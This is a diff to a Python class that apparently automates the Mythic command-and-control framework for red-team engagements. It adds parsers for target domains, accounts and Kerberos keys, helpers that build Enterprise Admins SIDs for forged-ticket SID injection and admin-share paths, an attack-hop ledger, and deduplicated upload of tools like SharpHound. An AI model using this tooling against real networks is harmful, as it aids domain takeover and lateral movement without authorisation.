+            inputs.get("domain") or inputs.get("source_domain") or intent.get("domain") or
+            intent.get("source_domain") or target_fields.get("domain")
+        ).casefold()
+
+    def _capability_source_domain(self, action, inputs: dict) -> str:
+        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
+        target_fields = {}
+        try:
+            for part in self._capability_text(getattr(action, "target", "")).split(";"):
+                if "=" in part:
+                    key, value = part.split("=", 1)
+                    target_fields[key.strip().casefold()] = value.strip()
+        except Exception:
+            target_fields = {}
+        return self._capability_text(
+            inputs.get("source_domain") or inputs.get("forge_domain") or intent.get("source_domain")
+            or target_fields.get("source_domain") or inputs.get("domain") or intent.get("domain")
+            or target_fields.get("domain")
+        ).casefold()
+
+    def _capability_target_domain(self, action, inputs: dict) -> str:
+        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
+        target_fields = {}
+        try:
+            for part in self._capability_text(getattr(action, "target", "")).split(";"):
+                if "=" in part:
+                    key, value = part.split("=", 1)
+                    target_fields[key.strip().casefold()] = value.strip()
+        except Exception:
+            target_fields = {}
+        return self._capability_text(
+            inputs.get("target_domain") or inputs.get("effect_domain") or intent.get("target_domain") or
+            intent.get("effect_domain") or target_fields.get("target_domain")
+        ).casefold()
+
+    def _capability_account(self, action, inputs: dict) -> str:
+        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
+        target_fields = {}
+        try:
+            for part in self._capability_text(getattr(action, "target", "")).split(";"):
+                if "=" in part:
+                    key, value = part.split("=", 1)
+                    target_fields[key.strip().casefold()] = value.strip()
+        except Exception:
+            target_fields = {}
+        return self._canonical_credential_account(
+            inputs.get("account") or inputs.get("user") or inputs.get("principal")
+            or intent.get("account") or intent.get("user") or intent.get("principal")
+            or target_fields.get("account") or target_fields.get("user") or target_fields.get("principal")
+        )
+
+    def _canonical_credential_account(self, value) -> str:
+        account = self._capability_text(value).strip().casefold()
+        if "\\" in account:
+            account = account.rsplit("\\", 1)[1].strip()
+        if "@" in account:
+            account = account.split("@", 1)[0].strip()
+        return account
+
+    def _capability_account_domain(self, action, inputs: dict) -> str:
+        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
+        target_fields = {}
+        try:
+            for part in self._capability_text(getattr(action, "target", "")).split(";"):
+                if "=" in part:
+                    key, value = part.split("=", 1)
+                    target_fields[key.strip().casefold()] = value.strip()
+        except Exception:
+            target_fields = {}
+        account = self._capability_text(
+            inputs.get("account") or inputs.get("user") or inputs.get("principal")
+            or intent.get("account") or intent.get("user") or intent.get("principal")
+            or target_fields.get("account") or target_fields.get("user") or target_fields.get("principal")
+        )
+        explicit = self._capability_text(
+            inputs.get("account_domain") or inputs.get("reader_domain") or inputs.get("principal_domain")
+            or intent.get("account_domain") or intent.get("reader_domain") or intent.get("principal_domain")
+            or target_fields.get("account_domain") or target_fields.get("reader_domain")
+            or target_fields.get("principal_domain")
+        ).casefold()
+        if explicit:
+            return explicit
+        if "@" in account:
+            return account.rsplit("@", 1)[1].casefold()
+        return ""
+
+    def _capability_local_account(self, action, inputs: dict) -> str:
+        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
+        target_fields = {}
+        try:
+            for part in self._capability_text(getattr(action, "target", "")).split(";"):
+                if "=" in part:
+                    key, value = part.split("=", 1)
+                    target_fields[key.strip().casefold()] = value.strip()
+        except Exception:
+            target_fields = {}
+        return self._capability_text(
+            inputs.get("local_account") or inputs.get("local_user") or inputs.get("username")
+            or intent.get("local_account") or intent.get("local_user") or intent.get("username")
+            or target_fields.get("local_account") or target_fields.get("local_user") or "Administrator"
+        )
+
+    def _capability_target_host(self, action, inputs: dict) -> str:
+        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
+        target_fields = {}
+        try:
+            for part in self._capability_text(getattr(action, "target", "")).split(";"):
+                if "=" in part:
+                    key, value = part.split("=", 1)
+                    target_fields[key.strip().casefold()] = value.strip()
+        except Exception:
+            target_fields = {}
+        return self._capability_host_short(
+            inputs.get("target_host") or inputs.get("host") or inputs.get("computer") or inputs.get("target")
+            or intent.get("target_host") or intent.get("host") or intent.get("computer") or intent.get("target")
+            or target_fields.get("target_host") or target_fields.get("host") or target_fields.get("computer")
+            or target_fields.get("target")
+        )
+
+    def _capability_managed_secret_target_domain(self, action, inputs: dict) -> str:
+        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
+        target_fields = {}
+        try:
+            for part in self._capability_text(getattr(action, "target", "")).split(";"):
+                if "=" in part:
+                    key, value = part.split("=", 1)
+                    target_fields[key.strip().casefold()] = value.strip()
+        except Exception:
+            target_fields = {}
+        explicit = self._capability_text(
+            inputs.get("target_domain") or intent.get("target_domain") or target_fields.get("target_domain")
+            or inputs.get("domain") or intent.get("domain") or target_fields.get("domain")
+        ).casefold()
+        if explicit:
+            return explicit
+        _, domain = self._capability_host_domain(
+            inputs.get("target_host") or inputs.get("host") or inputs.get("computer") or inputs.get("target")
+            or intent.get("target_host") or intent.get("host") or intent.get("computer") or intent.get("target")
+            or target_fields.get("target_host") or target_fields.get("host") or target_fields.get("computer")
+            or target_fields.get("target")
+        )
+        return domain
+
+    def _capability_callback_id(self, action, inputs: dict) -> str:
+        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
+        target_fields = {}
+        try:
+            for part in self._capability_text(getattr(action, "target", "")).split(";"):
+                if "=" in part:
+                    key, value = part.split("=", 1)
+                    target_fields[key.strip().casefold()] = value.strip()
+        except Exception:
+            target_fields = {}
+        callback_id = self._capability_text(
+            inputs.get("callback_id") or inputs.get("callback") or inputs.get("callback_display_id")
+            or intent.get("callback_id") or intent.get("callback") or intent.get("callback_display_id")
+            or target_fields.get("callback") or target_fields.get("callback_id")
+        ).casefold().lstrip("#")
+        if callback_id.startswith("cb") and callback_id[2:].isdigit():
+            return callback_id[2:]
+        return callback_id
+
+    def _capability_target_host_from_context(self, context: dict) -> str:
+        action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
+        intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
+        return self._capability_host_short(intent.get("target_host") or intent.get("host") or self._target_field(context, "target"))
+
+    def _capability_target_domain_from_context(self, context: dict) -> str:
+        action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
+        intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
+        explicit = self._capability_text(intent.get("target_domain") or intent.get("domain") or self._target_field(context, "target_domain")).casefold()
+        if explicit:
+            return explicit
+        _, domain = self._capability_host_domain(intent.get("target_host") or intent.get("host") or self._target_field(context, "target"))
+        return domain
+
+    def _target_field(self, context: dict, key: str) -> str:
+        try:
+            target = self._capability_text(context.get("target"))
+            for part in target.split(";"):
+                if "=" not in part:
+                    continue
+                field, value = part.split("=", 1)
+                if field.strip().casefold() == key:
+                    return value.strip()
+        except Exception:
+            return ""
+        return ""
+
+    def _capability_has_ticket_key(self, inputs: dict) -> bool:
+        for key in ("aes256", "aes128", "rc4", "ntlm", "nthash", "krbtgt_hash", "key", "krbtgt_key"):
+            if self._capability_text(inputs.get(key)).strip():
+                return True
+        return False
+
+    def _capability_host_domain(self, value) -> tuple[str, str]:
+        host = self._capability_text(value).strip().strip("\\/")
+        if not host:
+            return "", ""
+        if "/" in host and not host.startswith("\\\\"):
+            _, _, host = host.partition("/")
+        if "@" in host:
+            host = host.split("@", 1)[0]
+        host = host.rstrip(".")
+        if host.endswith("$"):
+            host = host[:-1]
+        parts = [part for part in host.casefold().split(".") if part]
+        if len(parts) >= 3:
+            return parts[0], ".".join(parts[1:])
+        return host.split(".", 1)[0].casefold(), ""
+
+    def _capability_host_short(self, value) -> str:
+        host, _domain = self._capability_host_domain(value)
+        if host:
+            return host
+        text = self._capability_text(value).strip().strip("\\/")
+        if not text:
+            return ""
+        if "@" in text:
+            text = text.split("@", 1)[0]
+        if text.endswith("$"):
+            text = text[:-1]
+        return text.split(".", 1)[0].casefold()
+
+    def _capability_host_name(self, value: str, domain: str = "") -> str:
+        host = self._capability_text(value).strip().strip("\\/")
+        if not host:
+            return ""
+        if "/" in host and not host.startswith("\\\\"):
+            service, _, remainder = host.partition("/")
+            if service.strip() and remainder.strip():
+                host = remainder.strip()
+        if "@" in host:
+            host = host.split("@", 1)[0]
+        host = host.rstrip(".")
+        if host.endswith("$"):
+            host = host[:-1]
+        if "." not in host and domain:
+            host = f"{host}.{self._capability_text(domain).strip().strip('.')}"
+        return host
+
+    def _capability_unc_from_windows_path(self, host: str, path: str) -> str:
+        host_text = self._capability_text(host).strip().strip("\\/")
+        path_text = self._capability_text(path).strip().replace("/", "\\")
+        drive_unc = _re_mod.match(r"^\\+([^\\]+)\\([a-zA-Z])\$(?:\\(.*))?$", path_text)
+        if drive_unc:
+            unc_host = drive_unc.group(1).strip().strip("\\/")
+            drive = drive_unc.group(2).upper()
+            tail = (drive_unc.group(3) or "").strip("\\/")
+            return f"\\\\{unc_host}\\{drive}$" + (f"\\{tail}" if tail else "")
+        if path_text.startswith("\\\\"):
+            return "\\\\" + path_text.lstrip("\\")
+        drive, sep, tail = path_text.partition(":")
+        if sep and len(drive) == 1:
+            tail = tail.lstrip("\\/")
+            return f"\\\\{host_text}\\{drive.upper()}$\\{tail}"
+        normalized = path_text.lstrip("\\/")
+        return f"\\\\{host_text}\\C$\\{normalized}"
+
+    def _capability_slug(self, value) -> str:
+        text = _re_mod.sub(r"[^a-zA-Z0-9]+", "_", self._capability_text(value).strip().lower())
+        text = _re_mod.sub(r"_+", "_", text).strip("_")
+        return text or "target"
+
+    def _kerberos_account_context_key(self, callback_display_id, account: str, domain: str) -> tuple:
+        return (
+            str(callback_display_id),
+            self._capability_text(account).casefold(),
+            self._capability_text(domain).casefold(),
+        )
+
+    def _ticket_cache_output_has_account(self, output: str, account: str, domain: str) -> bool:
+        text = self._capability_text(output).casefold()
+        account_cf = self._capability_text(account).casefold()
+        domain_cf = self._capability_text(domain).casefold()
+        if not text or not account_cf or not domain_cf:
+            return False
+        account_forms = {
+            account_cf,
+            f"{account_cf}@{domain_cf}",
+            f"{domain_cf}\\{account_cf}",
+        }
+        has_account = any(form in text for form in account_forms)
+        has_domain = domain_cf in text or f"krbtgt/{domain_cf}" in text
+        has_ticket = any(marker in text for marker in ("krbtgt", "ticket", "cached tickets", "client"))
+        return bool(has_account and has_domain and has_ticket)
+
+    def _infer_capability_key_type(self, value: str) -> str:
+        text = self._capability_text(value).strip()
+        if _re_mod.fullmatch(r"[0-9a-fA-F]{64}", text):
+            return "aes256"
+        if _re_mod.fullmatch(r"[0-9a-fA-F]{32}", text):
+            return "rc4"
+        return ""
+
+    def _parent_domain_for_capability(self, domain: str) -> str:
+        parts = [part for part in self._capability_text(domain).casefold().split(".") if part]
+        if len(parts) > 2:
+            return ".".join(parts[1:])
+        return self._capability_text(domain).casefold()
+
+    def _capability_json_value(self, value):
+        if isinstance(value, str):
+            stripped = value.strip()
+            if stripped and stripped[0] in "{[":
+                try:
+                    return json.loads(stripped)
+                except Exception:
+                    return value
+            return value
+        return value
+
+    def _capability_list(self, value) -> list:
+        value = self._capability_json_value(value)
+        if isinstance(value, (list, tuple, set)):
+            return [self._capability_text(item) for item in value if self._capability_text(item)]
+        text = self._capability_text(value)
+        return [text] if text else []
+
+    def _capability_sid_list(self, value) -> list[str]:
+        out: list[str] = []
+        for item in self._capability_list(value):
+            for piece in item.split(","):
+                sid = piece.strip()
+                if sid:
+                    out.append(sid)
+        return out
+
+    def _capability_text(self, value) -> str:
+        if value is None:
+            return ""
+        return str(value).strip()
+
+    def _capability_input_errors(self, inputs: dict) -> list[str]:
+        errors = inputs.get("_capability_input_errors") if isinstance(inputs, dict) else []
+        if not isinstance(errors, list):
+            return []
+        return [self._capability_text(item) for item in errors if self._capability_text(item)]
+
+    def _add_capability_input_error(self, inputs: dict, error: str) -> None:
+        if not isinstance(inputs, dict):
+            return
+        errors = inputs.setdefault("_capability_input_errors", [])
+        if not isinstance(errors, list):
+            inputs["_capability_input_errors"] = errors = []
+        if error not in errors:
+            errors.append(error)
+
+    def _remove_capability_input_error(self, inputs: dict, error: str) -> None:
+        if not isinstance(inputs, dict):
+            return
+        errors = inputs.get("_capability_input_errors")
+        if not isinstance(errors, list):
+            return
+        inputs["_capability_input_errors"] = [item for item in errors if item != error]
+
+    def _has_trusted_extra_sid_source(self, inputs: dict) -> bool:
+        if not isinstance(inputs, dict):
+            return False
+        if inputs.get("trusted_extra_sids") is True or inputs.get("trusted_sids") is True:
+            return True
+        for key in (
+            "extra_sids_source",
+            "parent_domain_sid_source",
+            "enterprise_admins_sid_source",
+            "sid_source",
+            "sid_evidence",
+            "domain_sid_source",
+        ):
+            text = self._capability_text(inputs.get(key)).casefold()
+            if not text:
+                continue
+            if any(marker in text for marker in (
+                "bloodhound",
+                "directory",
+                "ldap",
+                "samr",
+                "lookupsid",
+                "whoami",
+                "windows",
+                "task",
+                "operator",
+                "manual",
+                "verified",
+            )):
+                return True
+        return False
+
+    def _is_sid(self, value) -> bool:
+        return bool(_re_mod.fullmatch(r"S-\d+(?:-\d+)+", self._capability_text(value), flags=_re_mod.IGNORECASE))
+
+    def _is_domain_sid(self, value) -> bool:
+        return bool(_re_mod.fullmatch(
+            r"S-1-5-21-\d+-\d+-\d+",
+            self._capability_text(value),
+            flags=_re_mod.IGNORECASE,
+        ))
+
+    def _normalize_enterprise_admins_sid(self, value) -> str:
+        sid = self._capability_text(value)
+        if _re_mod.fullmatch(r"S-1-5-21-\d+-\d+-\d+-519", sid, flags=_re_mod.IGNORECASE):
+            return sid
+        return ""
+
+    def _normalize_parent_enterprise_admins_sid(self, value) -> str:
+        sid = self._capability_text(value)
+        if self._is_domain_sid(sid):
+            return f"{sid}-519"
+        return self._normalize_enterprise_admins_sid(sid)
 
     def _prior_verified_credential_hop(self, technique, target_key):
         """The existing hop for (technique, target_key) that is `achieved` with a REAL key in evidence
@@ -2260,6 +9931,10 @@ class MythicTools:
             return
         if SAGE_ENGAGEMENT_ID and SAGE_ENGAGEMENT_ID != "default":
             self._engagement_key = SAGE_ENGAGEMENT_ID   # explicit override wins; pin it, never query
+            try:
+                self._load_engagement_ledger(replace=True)
+            except Exception:
+                pass
             return
         async with self._engagement_key_lock:
             if self._engagement_key is not None:        # another coroutine resolved while we waited
@@ -2274,9 +9949,9 @@ class MythicTools:
                 key = None
             if key:
                 self._engagement_key = key
-                # __init__ loaded under the 'default' key (no client yet); reload under the operation key.
+                # Reload under the operation key before any planner/gate decision uses durable state.
                 try:
-                    self._load_engagement_ledger()
+                    self._load_engagement_ledger(replace=True)
                 except Exception:
                     pass
                 self._notice_legacy_ledgers()
@@ -2306,23 +9981,33 @@ class MythicTools:
         """Path to this engagement's durable JSON hop ledger (keyed per Mythic operation, not per-solve)."""
         return _engagement_ledger_file(self._eng_key())
 
-    def _load_engagement_ledger(self) -> None:
+    def _load_engagement_ledger(self, *, replace: bool = False) -> None:
         """Load the durable hop ledger from disk into self._engagement_hops. Fail-open: any error
         (missing file, bad JSON, unreadable) leaves the in-memory ledger untouched. NO LLM inference."""
         path = self._engagement_ledger_path()
         if not os.path.exists(path):
+            if replace:
+                self._engagement_hops = []
             return
         try:
             with open(path, "r", encoding="utf-8") as fh:
                 payload = json.load(fh)
         except Exception:
             return
+        if isinstance(payload, dict):
+            objective = self._human_engagement_objective(payload.get("objective"))
+            if objective:
+                self._engagement_objective_text = objective
         items = payload.get("hops") if isinstance(payload, dict) else payload
         try:
             from . import engagement_state
         except ImportError:
             import engagement_state
         loaded = engagement_state.hops_from_dicts(items)
+        graph_facts = (
+            engagement_state.graph_facts_from_dicts(payload.get("graph_facts"))
+            if isinstance(payload, dict) else []
+        )
         # Tag every loaded hop with 'durable' provenance: the gate will NOT silently hard-SKIP a durable
         # hop unless live footholds corroborate it (run-provenance hops keep the trustworthy hard-SKIP).
         for _h in loaded:
@@ -2341,8 +10026,14 @@ class MythicTools:
             loaded, _dropped = engagement_state.filter_hops_by_ttl(
                 loaded, datetime.now(timezone.utc).isoformat(), ttl
             )
-        if loaded:
+        if loaded or replace:
             self._engagement_hops = loaded
+            if graph_facts or replace:
+                self._engagement_graph_facts = graph_facts
+                self._engagement_graph_facts_ts = (
+                    payload.get("graph_facts_updated") or payload.get("updated")
+                    if isinstance(payload, dict) else None
+                )
             # Make durable resume LOUD, not silent: a loaded "achieved" hop is a BELIEF, not verified
             # live, so the operator must SEE what was resumed (and from when). Durable hops are
             # corroborated by live footholds before any hard-SKIP, and shown as "(durable, unverified)"
@@ -2370,6 +10061,10 @@ class MythicTools:
             "objective": self._engagement_objective(),
             "updated": datetime.now(timezone.utc).isoformat(),
             "hops": engagement_state.hops_to_dicts(self._engagement_hops),
+            "graph_facts": engagement_state.graph_facts_to_dicts(
+                getattr(self, "_engagement_graph_facts", []) or []
+            ),
+            "graph_facts_updated": getattr(self, "_engagement_graph_facts_ts", None),
         }
         tmp = f"{path}.{os.getpid()}.tmp"
         with open(tmp, "w", encoding="utf-8") as fh:
@@ -2773,6 +10468,22 @@ class MythicTools:
             return json.dumps({"status": "error", "file_uuid": file_uuid,
                                "error": "Mythic returned no content for this file UUID."}, sort_keys=True)
         safe_name = os.path.basename(file_name) if file_name else f"{file_uuid}.zip"
+        if not _looks_like_bloodhound_collection_zip(file_content):
+            try:
+                await self._record_graph_built(callback_display_id, False)
+            except Exception:
+                pass
+            return json.dumps({
+                "status": "error",
+                "file_uuid": file_uuid,
+                "filename": safe_name,
+                "bytes": len(file_content),
+                "error": (
+                    "Downloaded file is not a valid BloodHound collection ZIP. Do not ingest this artifact; "
+                    "the collection command likely failed or printed help/usage. Retry collection with valid "
+                    "collector arguments, then download and ingest the resulting ZIP."
+                ),
+            }, sort_keys=True)
         # 3. Resolve the BloodHound MCP's file_upload + domain_info tools (generic; no Mythic knowledge).
         upload_tool = None
         info_tool = None
@@ -3348,16 +11059,83 @@ class MythicTools:
             }, sort_keys=True)
         return json.dumps(categories, sort_keys=True)
 
+    async def _find_uploaded_file_by_hash(self, md5: str, sha1: str) -> dict | None:
+        """Find a non-deleted, operator-uploaded (NOT download-from-agent) Mythic file whose md5 AND sha1
+        matches. Content-based dedup: an unchanged binary keeps the same hash even if re-dropped under the
+        SAME name, so we reuse the existing registration instead of uploading a duplicate. A recompiled
+        binary has a new hash and still uploads. Mythic tracks md5/sha1 on `filemeta`."""
+        # Require BOTH md5 AND sha1 to match (not OR — a single-hash match widens the collision/poison
+        # surface, Forge 2026-06-12), and require the file to be COMPLETE (a partial/interrupted upload
+        # carries the hash but its bytes aren't fully on the server — reusing it breaks a later execute) and
+        # NOT a payload (is_payload) or agent-download.
+        if self.client is None or not (md5 and sha1):
+            return None
+        query = (
+            "query FileByHash($md5: String!, $sha1: String!) { "
+            "filemeta(where: { deleted: {_eq: false}, complete: {_eq: true}, is_payload: {_eq: false}, "
+            "is_download_from_agent: {_eq: false}, md5: {_eq: $md5}, sha1: {_eq: $sha1} }, "
+            "order_by: {id: desc}, limit: 1) { agent_file_id filename_utf8 md5 sha1 } }"
+        )
+        try:
+            resp = await mythic.execute_custom_query(self.client, query, variables={"md5": md5, "sha1": sha1})
+            rows = resp.get("filemeta") if isinstance(resp, dict) else None
+            return rows[0] if rows else None
+        except Exception as e:
+            logger.debug(f"file-by-hash lookup failed: {e}")
+            return None
+
+    async def _find_uploaded_file_by_name(self, filename: str) -> dict | None:
+        """Find the latest non-deleted operator-uploaded Mythic file by filename, including hash fields."""
+        if self.client is None or not filename:
+            return None
+        try:
+            row = await mythic.get_latest_uploaded_file_by_name(
+                self.client,
+                filename=filename,
+                custom_return_attributes="id agent_file_id filename_utf8 md5 sha1 complete",
+            )
+            return row if row else None
+        except Exception as e:
+            logger.debug(f"get_latest_uploaded_file_by_name failed for {filename}: {e}")
+            return None
+
+    async def _register_file_dedup(self, filename: str, content: bytes) -> tuple[str, bool]:
+        """Register a file with Mythic, but reuse an existing upload only when exact content AND filename match.
+
+        Apollo's by-name commands resolve `assembly_name` through Mythic filemeta by filename. Reusing an
+        identical hash under a different filename would return a valid UUID but leave `execute_assembly
+        <filename>` resolving to an older row or no row, so same-content/different-name still uploads under the
+        requested filename.
+        """
+        md5 = hashlib.md5(content).hexdigest()
+        sha1 = hashlib.sha1(content).hexdigest()
+        existing = await self._find_uploaded_file_by_hash(md5, sha1)
+        existing_name = str((existing or {}).get("filename_utf8") or "")
+        if existing and existing.get("agent_file_id") and existing_name.casefold() == str(filename or "").casefold():
+            logger.info(
+                f"🔁 [upload-dedup] {filename}: identical md5/sha1 already in Mythic "
+                f"(uuid={existing['agent_file_id']}, name={existing.get('filename_utf8')!r}) — reusing, not re-uploading."
+            )
+            return existing["agent_file_id"], True
+        if existing and existing.get("agent_file_id"):
+            logger.info(
+                f"🔁 [upload-dedup] {filename}: identical md5/sha1 exists as {existing_name!r}, "
+                "but by-name tasking needs the requested filename — uploading a new filemeta row."
+            )
+        file_uuid = await mythic.register_file(self.client, filename=filename, contents=content)
+        return file_uuid, False
+
     async def ensure_tool_uploaded(
         self,
         binary_filename: Annotated[str, "The tool binary filename, e.g. 'SharpHound.exe' (matches a TTP's binary_filename)."],
     ) -> str:
         """Ensure a tool binary is in Mythic's file store, uploading it from the tools/ drop zone if needed.
 
-        Workflow: (1) check Mythic's file store by name; (2) if absent, look for the file in the
-        operator drop zone at Payload_Type/sage/tools/<binary_filename>; (3) if found, register it
-        with Mythic via register_file. Returns the Mythic file UUID to pass as the File parameter of
-        a subsequent issue_task_and_waitfor_task_output call (e.g. assembly_file for inline_assembly).
+        Workflow: (1) check Mythic's file store by name and compare hashes when local bytes are available;
+        (2) if absent or same-name content changed, look for the file in the operator drop zone at
+        Payload_Type/sage/tools/<binary_filename>; (3) if found, register it with Mythic via register_file
+        using md5/sha1 dedupe. Returns the Mythic file UUID to pass as the File parameter of a subsequent
+        issue_task_and_waitfor_task_output call (e.g. assembly_file for inline_assembly).
 
         Args:
             binary_filename: The tool binary filename (matches a TTP's binary_filename).
@@ -3368,17 +11146,47 @@ class MythicTools:
         if self.client is None:
             raise Exception("MythicAPIClient not initialized. Call login() first.")
         logger.debug(f"🛠️ Calling ensure_tool_uploaded tool (binary={binary_filename!r})")
-        # 1. Already in Mythic's file store?
-        try:
-            existing = await mythic.get_latest_uploaded_file_by_name(self.client, filename=binary_filename)
-            if existing:
-                uuid = existing.get("agent_file_id") or existing.get("id")
-                if uuid:
-                    return json.dumps({"status": "already_present", "binary_filename": binary_filename, "file_uuid": uuid}, sort_keys=True)
-        except Exception as e:
-            logger.debug(f"get_latest_uploaded_file_by_name failed for {binary_filename}: {e}")
-        # 2. Operator drop zone
         local_path = ttp_library.TOOLS_DIR / binary_filename
+        local_content: bytes | None = None
+        local_md5 = ""
+        local_sha1 = ""
+        if local_path.is_file():
+            try:
+                local_content = local_path.read_bytes()
+                local_md5 = hashlib.md5(local_content).hexdigest()
+                local_sha1 = hashlib.sha1(local_content).hexdigest()
+            except Exception as e:
+                return json.dumps({"status": "error", "binary_filename": binary_filename, "error": str(e)}, sort_keys=True)
+
+        # 1. Already in Mythic's file store? If local bytes exist, same-name reuse requires same md5+sha1.
+        existing = await self._find_uploaded_file_by_name(binary_filename)
+        if existing:
+            uuid = existing.get("agent_file_id") or existing.get("id")
+            existing_md5 = str(existing.get("md5") or "")
+            existing_sha1 = str(existing.get("sha1") or "")
+            if uuid and local_content is None:
+                return json.dumps({
+                    "status": "already_present",
+                    "binary_filename": binary_filename,
+                    "file_uuid": uuid,
+                    "hash_check": "skipped_no_local_copy",
+                }, sort_keys=True)
+            if uuid and local_md5 and local_sha1 and existing_md5 == local_md5 and existing_sha1 == local_sha1:
+                return json.dumps({
+                    "status": "already_present",
+                    "binary_filename": binary_filename,
+                    "file_uuid": uuid,
+                    "dedup": "name_hash",
+                }, sort_keys=True)
+            if uuid and (not existing_md5 or not existing_sha1):
+                return json.dumps({
+                    "status": "already_present",
+                    "binary_filename": binary_filename,
+                    "file_uuid": uuid,
+                    "hash_check": "unavailable",
+                }, sort_keys=True)
+
+        # 2. Operator drop zone
         if not local_path.is_file():
             return json.dumps({
                 "status": "missing",
@@ -3389,10 +11197,22 @@ class MythicTools:
                         f"download_tool(binary_filename) FIRST (with operator approval) to fetch it into tools/, "
                         f"then call ensure_tool_uploaded again.",
             }, sort_keys=True)
-        # 3. Register the local file with Mythic
+        # 3. Content-dedup then register: reuse an existing Mythic file with the SAME md5/sha1 (refuse a
+        #    duplicate upload of an unchanged binary); only a changed/recompiled binary actually uploads.
         try:
-            file_uuid = await mythic.register_file(self.client, filename=binary_filename, contents=local_path.read_bytes())
-            return json.dumps({"status": "uploaded", "binary_filename": binary_filename, "file_uuid": file_uuid}, sort_keys=True)
+            file_uuid, reused = await self._register_file_dedup(binary_filename, local_content or local_path.read_bytes())
+            response = {
+                "status": "already_present" if reused else "uploaded",
+                "binary_filename": binary_filename,
+                "file_uuid": file_uuid,
+                "dedup": "hash" if reused else "none",
+            }
+            if existing:
+                response["reason"] = "same_name_hash_changed"
+                response["superseded_file_uuid"] = existing.get("agent_file_id") or existing.get("id")
+            return json.dumps({
+                **response,
+            }, sort_keys=True)
         except Exception as e:
             return json.dumps({"status": "error", "binary_filename": binary_filename, "error": str(e)}, sort_keys=True)
 
